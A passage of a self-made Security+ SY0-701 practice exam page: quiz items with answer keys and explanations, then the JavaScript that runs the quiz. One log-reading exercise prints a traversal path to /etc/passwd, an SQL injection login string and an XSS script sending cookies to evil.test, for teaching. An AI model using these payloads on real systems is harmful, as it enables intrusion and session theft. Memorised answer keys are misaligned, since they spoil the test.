{"kind":"mcq","d":4,"obj":"4.6","text":"A company wants to replace passwords with an authentication method in which the private key never leaves the user's device and the server stores only a public key. Which approach fits?","o":["A password vault","Security questions","Password expiration every 30 days","Passkeys (passwordless authentication)"],"a":3,"e":"The FIDO Alliance describes passkey authentication as replacing passwords with a pair of cryptographic keys. The private key stays on the user's device while the public key sits on the server, and no password is transmitted or stored.","w":[{"t":"A password vault","d":"Software that stores and fills in a user's many passwords.","x":"It still relies on passwords. It does not replace them with a key pair."},{"t":"Security questions","d":"Knowledge-based answers used to recover or confirm an account.","x":"They are shared secrets, not a key pair held on a device."},{"t":"Password expiration every 30 days","d":"Forcing users to change passwords on a schedule.","x":"It keeps passwords in place and does not move to a device-held private key."},null],"src":[["FIDO Alliance: passkey authentication","https://fidoalliance.org/?p=83980"],["SY0-701 Study Guide (176 pp.), §4.4"]]},
{"kind":"mcq","d":4,"obj":"4.6","text":"Which password policy matches the current NIST SP 800-63B guidance for authenticators?","o":["Force every user to change passwords every 60 days","Require one uppercase letter, one number, and one symbol in every password","Allow password managers and pasting, do not force periodic changes, and impose no composition rules such as mixed character types","Block pasting into password fields so that users must type each one"],"a":2,"e":"NIST says verifiers should permit pasting, shall not require periodic password changes (a change is forced only on evidence of compromise), and shall not impose other composition rules. Single-factor passwords must be at least 15 characters.","w":[{"t":"Force every user to change passwords every 60 days","d":"Mandatory periodic expiration.","x":"NIST says verifiers shall not require subscribers to change passwords periodically."},{"t":"Require one uppercase letter, one number, and one symbol in every password","d":"A composition rule.","x":"NIST says verifiers shall not impose composition rules."},null,{"t":"Block pasting into password fields so that users must type each one","d":"Disabling the paste function.","x":"NIST says verifiers should permit paste, which lets password managers work."}],"src":[["NIST SP 800-63B-4 Digital Identity Guidelines: Authentication and Authenticator Management","https://pages.nist.gov/800-63-4/sp800-63b/authenticators"],["SY0-701 Study Guide (176 pp.), §4.4"]]},
{"kind":"mcq","d":4,"obj":"4.6","text":"A network team wants a central protocol for device administration that keeps authentication, authorization, and accounting separate, so that individual commands typed on routers can be authorized and logged. Which protocol is designed for this?","o":["SAML","TACACS+","OAuth","LDAP"],"a":1,"e":"RFC 8907 describes TACACS+ as an AAA protocol used mainly for device administration. It keeps the three functions separate by design, which is useful for authorizing and logging individual commands, and it runs over TCP port 49.","w":[{"t":"SAML","d":"An XML-based standard for passing identity assertions between an identity provider and a service provider.","x":"It federates web logins and is not used for command authorization on network devices."},null,{"t":"OAuth","d":"A framework for delegating access to resources using tokens.","x":"It is about delegated authorization to apps, not administering network devices."},{"t":"LDAP","d":"A protocol for querying and updating a directory.","x":"It looks up directory entries and does not authorize or log commands on devices."}],"src":[["RFC 8907: The TACACS+ Protocol","https://rfc-editor.org/rfc/rfc8907"]]},
{"kind":"mcq","d":4,"obj":"4.7","text":"A development team merges code into a shared repository several times a day. Every merge automatically triggers builds and tests, and changes that pass are released to production with no manual approval step. Which practice does that last part describe?","o":["Continuous deployment","Continuous delivery","Continuous integration","Infrastructure as code"],"a":0,"e":"Red Hat defines continuous deployment as automatically releasing updates that pass testing into production. In continuous delivery, validated code is released to a repository and a person still makes the final push to production.","w":[null,{"t":"Continuous delivery","d":"Automating the release of validated code to a repository, with a manual push to production.","x":"A person approves the final step, but here the release is fully automatic."},{"t":"Continuous integration","d":"Frequently merging code changes into a shared repository with automated checks.","x":"That describes the merging and testing, not the automatic release to production."},{"t":"Infrastructure as code","d":"Provisioning infrastructure from machine-readable definition files.","x":"It manages infrastructure, not the release of application code."}],"src":[["Red Hat: What is CI/CD?","https://www.redhat.com/en/topics/devops/what-is-ci-cd"]]},
{"kind":"mcq","d":4,"obj":"4.7","text":"In security operations, what is the difference between automation and orchestration?","o":["Orchestration is manual work, while automation needs no human setup","Automation applies only to cloud systems, and orchestration only to on-premises systems","They are two names for the same thing","Automation makes a single task repeatable, while orchestration coordinates a sequence of automated tasks"],"a":3,"e":"The study guide says that automation focuses on making a single discrete task easily repeatable, while orchestration performs a sequence of automated tasks.","w":[{"t":"Orchestration is manual work, while automation needs no human setup","d":"A reversal of the real relationship.","x":"Orchestration is itself automated. It chains automated tasks together."},{"t":"Automation applies only to cloud systems, and orchestration only to on-premises systems","d":"A split by location.","x":"Neither term is limited by where the systems run."},{"t":"They are two names for the same thing","d":"A claim that the terms are interchangeable.","x":"The guide distinguishes a single task from a sequence of tasks."},null],"src":[["SY0-701 Study Guide (176 pp.), §6.4"]]},
{"kind":"mcq","d":4,"obj":"4.3","text":"A team tests a web application while it is running, sending crafted requests from the outside without access to the source code. Which testing approach is this?","o":["Static application security testing (SAST)","Code review by a peer","Dynamic application security testing (DAST)","Package monitoring"],"a":2,"e":"GitLab describes DAST as a black-box approach that scans running applications for vulnerabilities, without access to source code. SAST, in contrast, analyzes source code early in development.","w":[{"t":"Static application security testing (SAST)","d":"A white-box method that analyzes source code before the application runs.","x":"This test runs against the live application with no source access."},{"t":"Code review by a peer","d":"Developers reading each other's source code for flaws.","x":"It examines the code and does not test the running application."},null,{"t":"Package monitoring","d":"Watching third-party libraries for known vulnerabilities.","x":"It tracks components, not the behavior of a running web application."}],"src":[["GitLab: SAST vs. DAST","https://about.gitlab.com/topics/devsecops/sast-vs-dast/"],["SY0-701 Study Guide (176 pp.), §8.9"]]},
{"kind":"mcq","d":4,"obj":"4.3","text":"A researcher finds a flaw in a product. She shares enough information for users to make informed decisions, but withholds the sensitive details that an attacker could use. Which term describes this approach?","o":["Full disclosure","Responsible disclosure","Zero-day exploitation","A bug bounty program"],"a":1,"e":"The study guide defines responsible disclosure as making enough information known so that informed decisions can be made, without releasing sensitive details that could help an adversary. CISA's coordinated process works with the vendor so that fixes and public disclosure are timed together.","w":[{"t":"Full disclosure","d":"Making all details public without regard to additional harm, including exploitation by adversaries.","x":"She is deliberately holding back sensitive details."},null,{"t":"Zero-day exploitation","d":"Attacking a flaw the vendor has not yet had the chance to patch.","x":"She is informing people about the flaw, not attacking with it."},{"t":"A bug bounty program","d":"An incentive program that pays participants for finding and ethically reporting bugs.","x":"It is a reward scheme. The question describes how the information is released."}],"src":[["SY0-701 Study Guide (176 pp.), §8.1"],["CISA: Coordinated Vulnerability Disclosure Process","https://cisa.gov/coordinated-vulnerability-disclosure-process"]]},
{"kind":"mcq","d":3,"obj":"3.2","text":"A company with many branch offices wants to connect them over several links and apply security functions such as secure web gateway and zero trust access through one cloud-delivered service. Which concept does this describe?","o":["Secure access service edge (SASE)","Software-defined wide area network (SD-WAN) alone","Screened subnet","Network access control"],"a":0,"e":"Palo Alto Networks describes SASE as a framework that converges SD-WAN with cloud-delivered security. SD-WAN alone focuses on routing traffic across multiple links to improve performance.","w":[null,{"t":"Software-defined wide area network (SD-WAN) alone","d":"A technology that optimizes wide-area connectivity across multiple transport links.","x":"SD-WAN concentrates on the network. The security functions are what SASE adds."},{"t":"Screened subnet","d":"A buffer zone between the internet and the internal network.","x":"It is an on-premises network design, not a cloud-delivered service."},{"t":"Network access control","d":"Checking the identity and posture of devices before they join a network.","x":"It governs device admission and does not unify branch connectivity with cloud security."}],"src":[["Palo Alto Networks: SD-WAN vs. SASE","https://www.paloaltonetworks.com/cyberpedia/sd-wan-vs-sase"]]},
{"kind":"mcq","d":3,"obj":"3.4","text":"A data center loses utility power. A generator will take time to start and reach full output. What protects the servers during that gap?","o":["A second generator","A power distribution unit","Dual-stack networking","An uninterruptible power supply (UPS)"],"a":3,"e":"A UPS switches to battery in milliseconds and bridges the gap until a generator starts, which can take seconds or minutes. A generator can then supply power for days. The study guide adds that a UPS is required because a backup generator cannot be brought online fast enough.","w":[{"t":"A second generator","d":"Another engine-driven source of backup power.","x":"It also needs time to start, so it leaves the same gap."},{"t":"A power distribution unit","d":"A device that distributes electricity to rack equipment.","x":"It routes power to equipment but does not store any."},{"t":"Dual-stack networking","d":"Running IPv4 and IPv6 together.","x":"It is a networking configuration and has nothing to do with power."},null],"src":[["CyberPower: Differences between generators, UPS systems and inverters","https://www.cyberpower.com/global/en/blog/main-differences-between-generators-ups-systems-and-inverters"],["SY0-701 Study Guide (176 pp.), §7.2"]]},
{"kind":"mcq","d":3,"obj":"3.4","text":"Which plan is a predetermined set of instructions describing how an organization's mission essential functions will be sustained within 12 hours and for up to 30 days after a disaster?","o":["Business impact analysis","Risk register","Continuity of operations (COOP) plan","Statement of work"],"a":2,"e":"NIST SP 800-34 Rev. 1 defines a COOP plan as a predetermined set of instructions or procedures that describe how an organization's mission essential functions will be sustained within 12 hours and for up to 30 days as a result of a disaster event before returning to normal operations.","w":[{"t":"Business impact analysis","d":"An assessment of critical functions and the effect of their disruption, including RTO and RPO.","x":"It measures impact and sets targets. It is not the set of instructions for sustaining functions."},{"t":"Risk register","d":"A record of identified risks with owners, ratings, and thresholds.","x":"It tracks risks and does not describe how functions continue."},null,{"t":"Statement of work","d":"A document defining a vendor's deliverables, timeline, and cost.","x":"It scopes vendor work and is unrelated to disaster continuity."}],"src":[["NIST CSRC glossary: Continuity of Operations (COOP) Plan (from NIST SP 800-34 Rev. 1)","https://csrc.nist.gov/glossary/term/continuity_of_operations_plan"]]},
{"kind":"mcq","d":1,"obj":"1.4","text":"A hardware root of trust, such as a trusted platform module (TPM), is only as trustworthy as which of the following?","o":["The length of the user's login password","The vendor's implementation, including the chip manufacturers, firmware authors, and staff who supply the device","The brand of the monitor attached to the computer","The speed of the network connection"],"a":1,"e":"The study guide says a root of trust is only trustworthy if the vendor has implemented it properly. Anyone with the time and resources to modify the firmware could create a backdoor, so the whole supply chain must be trustworthy.","w":[{"t":"The length of the user's login password","d":"The number of characters in a user's password.","x":"Password length does not determine whether the hardware's own trust anchor is sound."},null,{"t":"The brand of the monitor attached to the computer","d":"An unrelated peripheral.","x":"A monitor plays no part in the chain of trust."},{"t":"The speed of the network connection","d":"How fast data moves across the network.","x":"Bandwidth has no bearing on the integrity of the hardware root of trust."}],"src":[["SY0-701 Study Guide (176 pp.), §15.4"]]},
{"kind":"mcq","d":5,"obj":"5.4","text":"A retailer accepts, processes, and transmits customers' payment card data. Which standard defines the safe handling of that data, and who administers it?","o":["PCI DSS, administered by the PCI Security Standards Council","HIPAA, administered by the PCI Security Standards Council","GDPR, administered by the card brands","SOC 2, administered by the PCI Security Standards Council"],"a":0,"e":"PCI DSS applies to all entities that store, process, or transmit cardholder data. The PCI Security Standards Council administers it, and the card brands enforce compliance through their own programs.","w":[null,{"t":"HIPAA, administered by the PCI Security Standards Council","d":"A US law covering protected health information.","x":"HIPAA covers health data, not payment cards, and the PCI Council does not administer it."},{"t":"GDPR, administered by the card brands","d":"The European Union's data protection regulation for personal data.","x":"GDPR is an EU law and is not a card brand standard."},{"t":"SOC 2, administered by the PCI Security Standards Council","d":"An audit report on a service organization's controls.","x":"It is an audit report, not the cardholder data standard."}],"src":[["PCI SSC: PCI DSS Quick Reference Guide","https://listings.pcisecuritystandards.org/documents/PCIDSS_QRGv3.pdf"],["SY0-701 Study Guide (176 pp.), §16.1"]]},
{"kind":"mcq","d":4,"obj":"4.2","text":"A company is retiring servers that held sensitive data and will send the drives to a recycler. It wants the media to be unusable for its original purpose. Which NIST SP 800-88 sanitization level fits?","o":["Clear","Purge","Deleting the files","Destroy"],"a":3,"e":"The IRS summary of NIST SP 800-88 describes Destroy as the ultimate form of sanitization. The media can no longer be used as originally intended, typically through shredding, incineration, pulverizing, or melting.","w":[{"t":"Clear","d":"Sanitization that protects against a robust keyboard attack, such as by overwriting.","x":"The drive would still work afterward, so it is not unusable."},{"t":"Purge","d":"Sanitization that protects against a laboratory attack, such as secure erase or degaussing.","x":"Purge resists recovery by specialized equipment, but the media is not necessarily made unusable."},{"t":"Deleting the files","d":"Removing file entries from the file system.","x":"NIST-based guidance says simple deletion does not count as sanitization."},null],"src":[["IRS: Media sanitization guidelines (summarizing NIST SP 800-88)","https://www.irs.gov/privacy-disclosure/media-sanitization-guidelines"],["SY0-701 Study Guide (176 pp.), §7.4"]]},
{"kind":"mcq","d":4,"obj":"4.2","text":"Which NIST SP 800-88 sanitization level is intended to protect the confidentiality of information against a laboratory attack, using methods such as secure erase or degaussing?","o":["Clear","Destroy","Purge","Archive"],"a":2,"e":"The IRS summary of NIST SP 800-88 says Purge protects against a laboratory attack, meaning recovery using specialized equipment and trained experts. Secure Erase for ATA drives and degaussing are examples.","w":[{"t":"Clear","d":"The lightest level, aimed at robust keyboard attacks and ordinary recovery methods.","x":"It is weaker than Purge and does not address laboratory attacks."},{"t":"Destroy","d":"The ultimate level, which leaves the media unusable.","x":"Destroy makes the media unusable, which is stronger than the stated goal."},null,{"t":"Archive","d":"Storing data for long-term retention.","x":"It preserves data and is not a sanitization level."}],"src":[["IRS: Media sanitization guidelines (summarizing NIST SP 800-88)","https://www.irs.gov/privacy-disclosure/media-sanitization-guidelines"]]},
{"kind":"mcq","d":4,"obj":"4.9","text":"During an investigation, an analyst wants a sensor to capture traffic on the network that is not addressed to the sensor's own network card. Which packet capture mode makes that possible?","o":["Normal mode","Promiscuous mode","Filtered capture","Syslog collection"],"a":1,"e":"The study guide says that in normal mode a NIC captures only frames intended for the interface, while in promiscuous mode the NIC accepts any frame it sees, even if it was not the intended recipient.","w":[{"t":"Normal mode","d":"The NIC captures only frames intended for the interface, filtering by MAC address.","x":"It would discard exactly the frames the analyst needs."},null,{"t":"Filtered capture","d":"Capture limited to specific data elements.","x":"It limits which data is kept. It does not control which frames the NIC accepts."},{"t":"Syslog collection","d":"Gathering log messages sent by devices.","x":"It collects event messages and not packets."}],"src":[["SY0-701 Study Guide (176 pp.), §12.8"]]},
{"kind":"pbq","type":"match","d":1,"obj":"1.1","title":"Match each control to its type","text":"For each situation, select the control type it BEST represents.","choices":["Preventive","Deterrent","Detective","Corrective","Compensating","Directive"],"rows":[{"label":"A sign at the entrance reading \"Premises protected by 24/7 video surveillance\"","a":1,"r":"It discourages bad behavior but does not physically stop anyone."},{"label":"A SIEM rule that raises an alert after five failed logins in one minute","a":2,"r":"It identifies an event after it starts, which is detection."},{"label":"Restoring a corrupted database from last night's backup","a":3,"r":"It repairs damage after an incident."},{"label":"A written acceptable use policy that staff must follow","a":5,"r":"It directs behavior through required rules."},{"label":"A firewall rule that blocks inbound Telnet","a":0,"r":"It stops the traffic before it can do harm."},{"label":"Extra logging and manager approval on a legacy system that cannot support MFA","a":4,"r":"It stands in for a control that cannot be applied, so it is compensating."}],"e":"Preventive controls stop an event, deterrents discourage it, detective controls find it, corrective controls fix the damage, compensating controls substitute for a missing control, and directive controls tell people what to do.","src":[["SY0-701 Study Guide (176 pp.), §1.6"]]},
{"kind":"pbq","type":"match","d":2,"obj":"2.4","title":"Identify the indicator in each log excerpt","text":"Each excerpt below comes from a different incident. Select the attack or indicator it shows.","choices":["Brute force","Password spraying","SQL injection","Cross-site scripting","Directory traversal","Impossible travel","Buffer overflow","Replay attack"],"rows":[{"m":1,"label":"GET /download?file=../../../../etc/passwd HTTP/1.1  200","a":4,"r":"The ../ sequences climb out of the web root to reach a system file."},{"m":1,"label":"POST /login  user=admin&pass=x' OR '1'='1' --","a":2,"r":"The quote and OR '1'='1' alter the SQL query logic."},{"m":1,"label":"Account \"jsmith\": 480 failed logins from 198.51.100.7 in 2 minutes","a":0,"r":"Many guesses against one account in a short time is brute force."},{"m":1,"label":"Password \"Summer2024!\" tried once each against 300 different accounts","a":1,"r":"One common password across many accounts avoids lockouts. This is spraying."},{"m":1,"label":"\"mlee\" signs in from Chicago at 09:02 and from Singapore at 09:40","a":5,"r":"The two locations cannot be reached in that time."},{"m":1,"label":"Comment field contains <script>document.location='http://evil.test/c?'+document.cookie<\/script>","a":3,"r":"Script injected into a page that runs in other users' browsers is XSS."}],"e":"Reading logs for the pattern behind the entries is a core Security+ skill: path sequences point to traversal, query fragments to injection, rate and spread to brute force versus spraying, and location and timing to impossible travel.","src":[["SY0-701 Study Guide (176 pp.), §4.4, §13.6, §13.11"]]},
{"kind":"pbq","type":"match","d":3,"obj":"3.2","title":"Trace packets through a firewall rule set","text":"The firewall protects the web server at 10.0.0.10. Rules are evaluated from top to bottom, and the first match wins. Decide what happens to each packet.","pre":"#  Action  Proto/Port  Source        Destination\n1  Allow   TCP 22      192.168.5.20  10.0.0.10\n2  Deny    TCP 22      Any           10.0.0.10\n3  Allow   TCP 443     Any           10.0.0.10\n4  Deny    Any         Any           Any","choices":["Allow","Deny"],"rows":[{"m":1,"label":"TCP 22 from 192.168.5.20 to 10.0.0.10","a":0,"r":"Rule 1 matches first."},{"m":1,"label":"TCP 22 from 203.0.113.9 to 10.0.0.10","a":1,"r":"Rule 1 does not match, rule 2 does."},{"m":1,"label":"TCP 443 from 203.0.113.9 to 10.0.0.10","a":0,"r":"Rule 3 matches."},{"m":1,"label":"UDP 53 from 203.0.113.9 to 10.0.0.10","a":1,"r":"Only the final deny-all rule matches."},{"m":1,"label":"TCP 443 from 203.0.113.9 to 10.0.0.25","a":1,"r":"Rule 3 applies only to 10.0.0.10, so the final deny-all rule applies."},{"m":1,"label":"TCP 22 from 192.168.5.20 to 10.0.0.10, if rules 1 and 2 were swapped","a":1,"r":"The broad deny would match first, so the admin would be blocked. Specific rules go before general ones."}],"e":"Firewalls use first-match processing, so rule order matters: specific rules go above general ones, and an explicit or implicit deny-all sits at the bottom.","src":[["SY0-701 Study Guide (176 pp.), §5.8, §5.9"]]},
{"kind":"pbq","type":"order","d":4,"obj":"4.8","title":"Put the incident response process in order","text":"Arrange the incident response activities in the order they occur, from first to last.","items":["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Lessons learned"],"e":"The SY0-701 objectives list the process as preparation, detection, analysis, containment, eradication, recovery, and lessons learned. Containment limits the damage, eradication removes the cause, and recovery restores normal operation.","src":[["SY0-701 Study Guide (176 pp.), §12.1"]]},
{"kind":"pbq","type":"match","d":4,"obj":"4.5","title":"Match each email security control to its description","text":"Select the control that matches each description.","choices":["SPF","DKIM","DMARC","S/MIME","TLS","DNSSEC"],"rows":[{"label":"A DNS record that lists which mail servers may send mail for a domain","a":0,"r":"Sender Policy Framework publishes the authorized senders."},{"label":"A digital signature added to message headers and checked with a public key published in DNS","a":1,"r":"DomainKeys Identified Mail verifies the message was signed by the domain."},{"label":"A policy telling receivers to quarantine or reject mail that fails authentication checks, with reporting","a":2,"r":"DMARC builds on SPF and DKIM and tells receivers what to do and where to report."},{"label":"Encrypts the body of a message end to end using certificates held by the sender and recipient","a":3,"r":"Secure/Multipurpose Internet Mail Extensions encrypts and signs the message itself."},{"label":"Encrypts the connection between two mail servers while the message is in transit","a":4,"r":"Transport Layer Security protects the connection, not the stored message."}],"e":"SPF, DKIM, and DMARC work together to stop spoofing, while S/MIME protects the message content and TLS protects the connection.","src":[["SY0-701 Study Guide (176 pp.), §11.4"]]},
{"kind":"pbq","type":"match","d":5,"obj":"5.2","title":"Calculate the risk and decide","text":"A server is worth $200,000. A ransomware event would destroy 40% of its value (exposure factor). Analysts expect it to happen once every two years. A control costing $30,000 per year would remove the risk entirely. Complete the analysis.","rows":[{"label":"Single loss expectancy (SLE)","c":["$40,000","$80,000","$100,000","$200,000"],"a":1,"r":"SLE = asset value x exposure factor = $200,000 x 0.40 = $80,000."},{"label":"Annualized rate of occurrence (ARO)","c":["0.25","0.5","1","2"],"a":1,"r":"Once every two years is 1 / 2 = 0.5 per year."},{"label":"Annualized loss expectancy (ALE)","c":["$20,000","$40,000","$80,000","$160,000"],"a":1,"r":"ALE = SLE x ARO = $80,000 x 0.5 = $40,000."},{"label":"Best decision","c":["Buy the control","Accept the risk"],"a":0,"r":"The control costs $30,000 a year and removes an expected $40,000 yearly loss, so it pays for itself."}],"e":"Quantitative risk analysis: SLE = asset value x exposure factor, ALE = SLE x ARO. A control is worth buying when its annual cost is less than the loss it prevents.","src":[["SY0-701 Study Guide (176 pp.), §15.1"]]}
];

const isPbq = x => x.kind === "pbq";
const inSrc = (x, f) => f === "all" || f === "full" || f === "quick" || (f === "pbq" && isPbq(x));
const nRows = x => x.type === "order" ? x.items.length : x.rows.length;
const choicesOf = (x, r) => r.c || x.choices;

/* ---------- helpers & state ---------- */
const KEY = "secplus701-bank-v2";
const app = document.getElementById("app");
let S = null, saved = null;
const srcBlock = x => !x.src || !x.src.length ? "" : `<p class="srcs"><b>Sources:</b> ` + x.src.map(r => /^https?:\/\//.test(r[1] || "") ? `<a href="${esc(r[1])}" target="_blank" rel="noopener noreferrer">${esc(r[0])}</a>` : esc(r[0])).join(" · ") + `</p>`;
const esc = s => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
const fmt = s => { s = Math.max(0, s); const m = Math.floor(s / 60), r = s % 60; return String(m).padStart(2, "0") + ":" + String(r).padStart(2, "0"); };
function save() { try { localStorage.setItem(KEY, JSON.stringify(S)); } catch (e) {} }
function load() { try { const s = localStorage.getItem(KEY); return s ? JSON.parse(s) : null; } catch (e) { return null; } }
function wipe() { try { localStorage.removeItem(KEY); } catch (e) {} }
function shuffle(a) { a = a.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; }

function score(x, a) {
  if (a === undefined || a === null) return 0;
  if (!isPbq(x)) return a === x.a ? 1 : 0;
  if (x.type === "order") return a.filter((v, i) => v === i).length / x.items.length;
  return x.rows.filter((r, i) => a[i] === r.a).length / x.rows.length;
}
function answered(x, a) {
  if (a === undefined || a === null) return false;
  if (isPbq(x) && x.type === "match") return a.some(v => v !== null && v !== undefined);
  return true;
}
const nAnswered = () => S.ids.filter(id => answered(Q[id], S.ans[id])).length;
const isLocked = id => S.mode === "study" && (isPbq(Q[id]) ? !!S.chk[id] : S.ans[id] !== undefined);

function newAttempt(ids, mode) {
  const ord = {};
  ids.forEach(id => { const x = Q[id]; if (isPbq(x) && x.type === "order") { let p; do { p = shuffle(x.items.map((_, i) => i)); } while (p.every((v, i) => v === i)); ord[id] = p; } });
  S = { ids, mode, ans: {}, chk: {}, ord, flags: {}, pos: 0, elapsed: 0, limit: mode === "exam" ? ids.length * 60 : 0, done: false, confirm: false, filter: "missed", src: "all" };
  save(); render(); window.scrollTo(0, 0);
}

function whyBlock(x, sel) {
  const items = x.o.map((o, i) => {
    const w = x.w[i];
    if (i === x.a || !w) return "";
    return `<li class="${i === sel ? "mine" : ""}"><b>${LET[i]}</b><div><div class="term">${esc(w.t)}${i === sel ? " <em>your pick</em>" : ""}</div><div>${esc(w.d)}</div><div class="no"><span>Why not here</span> ${esc(w.x)}</div></div></li>`;
  }).join("");
  return `<div class="why-wrap"><div class="label">The other options</div><ul class="why">${items}</ul></div>`;
}
const srcBadge = x => isPbq(x) ? `<span class="badge pbq">Performance-based</span>` : "";

/* PBQ rendering. mode: "live" (editable), "locked" (graded, in the exam card), "static" (review) */
function pbqBody(x, a, state) {
  const graded = state !== "live";
  let h = "";
  if (x.pre) h += `<pre class="code">${esc(x.pre)}</pre>`;
  if (x.type === "match") {
    h += `<div class="prows">` + x.rows.map((r, i) => {
      const ch = choicesOf(x, r), v = a ? a[i] : null, ok = v === r.a;
      const cls = graded ? (ok ? "ok" : "bad") : "";
      const sel = `<select data-r="${i}" aria-label="${esc(r.label)}" ${state === "live" ? "" : "disabled"}><option value="">Choose…</option>${ch.map((c, j) => `<option value="${j}" ${v === j ? "selected" : ""}>${esc(c)}</option>`).join("")}</select>`;
      const fb = graded ? `<div class="pf"><b>${ok ? "Correct." : "Correct answer: " + esc(ch[r.a]) + "."}</b> ${esc(r.r)}</div>` : "";
      return `<div class="prow ${cls}"><div class="pl ${r.m ? "mono" : ""}">${esc(r.label)}</div>${sel}${fb}</div>`;
    }).join("") + `</div>`;
  } else {
    const perm = a || S.ord[x.id];
    h += `<ol class="ord">` + perm.map((it, pos) => {
      const cls = graded ? (it === pos ? "ok" : "bad") : "";
      const mv = state === "live" ? `<div class="mv"><button data-act="mv" data-p="${pos}" data-d="-1" aria-label="Move up" ${pos === 0 ? "disabled" : ""}>▲</button><button data-act="mv" data-p="${pos}" data-d="1" aria-label="Move down" ${pos === perm.length - 1 ? "disabled" : ""}>▼</button></div>` : "<span></span>";
      return `<li class="${cls}"><span class="n">${pos + 1}</span><span>${esc(x.items[it])}</span>${mv}</li>`;
    }).join("") + `</ol>`;
    if (graded) h += `<div class="prow" style="grid-template-columns:1fr"><div class="pf"><b>Correct order:</b> ${x.items.map((t, i) => `${i + 1}. ${esc(t)}`).join(" → ")}</div></div>`;
  }
  return h;
}

/* ---------- views ---------- */
function startView() {
  const by = {}; Q.forEach(x => { const b = by[x.d] = by[x.d] || { n: 0 }; b.n++; });
  const nP = Q.filter(isPbq).length;
  const resume = saved && !saved.done ? `
    <div class="card row between">
      <div><b>Unfinished attempt</b><div class="label">${Object.keys(saved.ans).length} of ${saved.ids.length} answered · ${fmt(saved.elapsed)}</div></div>
      <button class="btn primary" data-act="resume">Resume</button>
    </div>` : "";
  const setOpt = (v, t, d, chk) => `<label class="choice"><input type="radio" name="set" value="${v}" ${chk ? "checked" : ""}><b>${t}</b><span>${d}</span></label>`;
  return `
  <div class="stack">
    <div class="hero">
      <div class="label">CompTIA Security+ · SY0-701</div>
      <h1>Security+ Practice Exam</h1>
      <p>${Q.length} questions mapped to the SY0-701 objectives, including ${nP} performance-based questions.</p>
    </div>
    ${resume}
    <div class="card stack">
      <div class="label">Mode</div>
      <div class="choices">
        <label class="choice"><input type="radio" name="mode" value="study" checked><b>Study</b><span>Answers lock and explanations show right away. Performance-based questions have a Check button.</span></label>
        <label class="choice"><input type="radio" name="mode" value="exam"><b>Exam</b><span>Countdown timer (one minute per question, so 90 minutes for a Full 90 set). No feedback until you finish.</span></label>
      </div>
      <div class="label">Question set</div>
      <div class="choices">
        ${setOpt("full", `Full 90`, `Random draw of 90 questions at the real exam's domain weights (11 / 20 / 16 / 25 / 18), including all 6 PBQs. A fresh mix each attempt. 90 minutes in Exam mode.`, true)}
        ${setOpt("all", `Entire bank`, `All ${Q.length} questions. Good for study; Exam mode allows one minute each.`)}
        ${setOpt("quick", `Quick 45`, `Half-length: 45 random questions (5 / 10 / 8 / 13 / 9 across the domains, 3 of them PBQs). 45 minutes in Exam mode.`)}
        ${setOpt("pbq", `Performance-based only`, `${nP} questions: matching, log reading, ordering, calculating.`)}
      </div>
      <div class="label">Question order</div>
      <div class="choices">
        <label class="choice"><input type="radio" name="order" value="real" checked><b>Like the real exam</b><span>Performance-based questions first, then the rest shuffled.</span></label>
        <label class="choice"><input type="radio" name="order" value="shuf"><b>Shuffled</b><span>Everything in random order.</span></label>
        <label class="choice"><input type="radio" name="order" value="list"><b>By domain</b><span>Grouped by SY0-701 domain, in order.</span></label>
      </div>
      <div><button class="btn primary" data-act="start">Start</button></div>
    </div>
    <div class="row">
      <button class="btn" data-act="open" data-d="dlg-compare">How this bank compares with the real exam</button>
      <button class="btn" data-act="open" data-d="dlg-about">About this page</button>
      <button class="btn" data-act="open" data-d="dlg-sources">Sources</button>
    </div>
    <dialog id="dlg-compare" aria-labelledby="dlg-compare-t">
      <div class="dlg-head"><h2 id="dlg-compare-t">How this bank compares with the real exam</h2><button class="btn" data-act="close" aria-label="Close">Close</button></div>
      <div class="dom h"><span>Domain</span><span>Exam</span><span>Here</span><span>Qs</span></div>
      ${Object.keys(DOMAINS).map(d => `<div class="dom"><span>${d}.0 ${DOMAINS[d].n}</span><span>${DOMAINS[d].w}%</span><span>${Math.round(by[d].n / Q.length * 100)}%</span><span>${by[d].n}</span></div>`).join("")}
      <p class="dlg-note">Exam weights come from the official SY0-701 objectives (version 5.0). The real exam has up to 90 questions in 90 minutes, mixing multiple-choice and performance-based items.</p>
    </dialog>
    <dialog id="dlg-about" aria-labelledby="dlg-about-t">
      <div class="dlg-head"><h2 id="dlg-about-t">About this page</h2><button class="btn" data-act="close" aria-label="Close">Close</button></div>
      <p>This is my own tool for studying for the CompTIA Security+ (SY0-701) exam. It is an independent project and is not affiliated with, endorsed by, or sponsored by CompTIA. CompTIA and Security+ are registered trademarks of CompTIA, Inc.</p>
      <p class="dlg-note">Practice scores here do not predict real exam results. The real exam reports a scaled score from 100 to 900.</p>
    </dialog>
    <dialog id="dlg-sources" aria-labelledby="dlg-sources-t">
      <div class="dlg-head"><h2 id="dlg-sources-t">Sources</h2><button class="btn" data-act="close" aria-label="Close">Close</button></div>
      <p>Domain weights and topic coverage follow the official CompTIA Security+ SY0-701 Exam Objectives (version 5.0).</p>
      <p>I wrote the questions, answer options, and explanations myself with help from Claude, an AI assistant.</p>
      <p>Most explanations end with a Sources line naming the study guide section, standard, or reference page the facts came from. Where a study guide disagreed with widely accepted standards, I used the standard.</p>
      <p class="dlg-note">This is study material, not an official or guaranteed representation of exam content.</p>
    </dialog>
  </div>`;
}

function examView() {
  const id = S.ids[S.pos], x = Q[id], total = S.ids.length;
  const a = S.ans[id], study = S.mode === "study", locked = isLocked(id);
  const unanswered = total - nAnswered();
  let body, reveal = "";
  if (isPbq(x)) {
    body = pbqBody(x, a, locked ? "locked" : "live");
    if (locked) {
      const sc = score(x, a), rows = nRows(x);
      reveal = `<div class="reveal ${sc === 1 ? "" : "miss"}" role="status"><b>${sc === 1 ? "All correct." : `${Math.round(sc * rows)} of ${rows} correct.`}</b><p>${esc(x.e)}</p>${srcBlock(x)}</div>`;
    } else if (study) {
      reveal = `<div><button class="btn primary" data-act="check">Check answer</button></div>`;
    }
  } else {
    body = `<div class="opts">` + x.o.map((o, i) => {
      let cls = "";
      if (locked) cls = i === x.a ? "ok" : (i === a ? "bad" : "");
      else if (a === i) cls = "sel";
